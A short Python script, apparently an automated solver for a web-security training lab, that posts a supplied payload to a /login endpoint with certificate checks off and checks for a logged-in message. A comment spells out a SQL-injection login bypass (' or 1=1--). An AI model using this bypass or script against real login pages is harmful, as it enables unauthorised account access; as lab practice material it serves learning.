import requests
from proxies import proxies
import json
# SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese' 
# SELECT * FROM users WHERE username = '' or 1=1-- AND password = ''

def solve(url: str, payload: str):
    uri = '/login'
    r = requests.session()
    data = json.loads(payload)
    r = r.post(url + uri, data=data,verify=False, proxies=proxies)
    if "Your username is" in r.text:
        return True
    else:
        return False
